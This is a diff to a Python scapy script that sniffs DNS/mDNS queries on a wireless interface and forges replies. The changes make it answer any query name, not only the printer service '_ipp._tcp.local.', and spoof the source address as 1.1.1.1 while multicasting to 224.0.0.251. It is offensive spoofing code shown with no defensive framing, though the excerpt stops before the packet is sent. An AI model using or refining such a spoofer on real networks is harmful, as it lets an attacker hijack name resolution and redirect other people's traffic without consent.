@@ -2,18 +2,21 @@ from scapy.all import *
 import os
 
 # Тут нужно добавлять точку в конце
-dns_to_spoof = '_ipp._tcp.local.'
+# dns_to_spoof = '_ipp._tcp.local.'
+dns_to_spoof = 'ANY'
 redirect_to = '1.1.1.1'
 interface = 'wlp2s0'
 
 def callback(packet):
 
+  # print(packet[Ether])
+
   # pkt.show()
-  if (packet[DNSQR].qname.decode("utf-8") == dns_to_spoof): # DNS question record
+  if ((packet[DNSQR].qname.decode("utf-8") == dns_to_spoof or dns_to_spoof == 'ANY') and packet[Ether].type != 34525): # DNS question record
 
         packet.show()
         print('----------------------------------------------')
-
+        print(packet[IP].version)
         # Construct the DNS packet
         # Construct the Ethernet header by looking at the sniffed packet
         eth = Ether(
@@ -23,8 +26,8 @@ def callback(packet):
 
         # Construct the IP header by looking at the sniffed packet
         ip = IP(
-            src=get_if_addr(interface),
-            dst=packet[IP].src
+            src=redirect_to,
+            dst='224.0.0.251'
             )
 
         # Construct the UDP header by looking at the sniffed packet
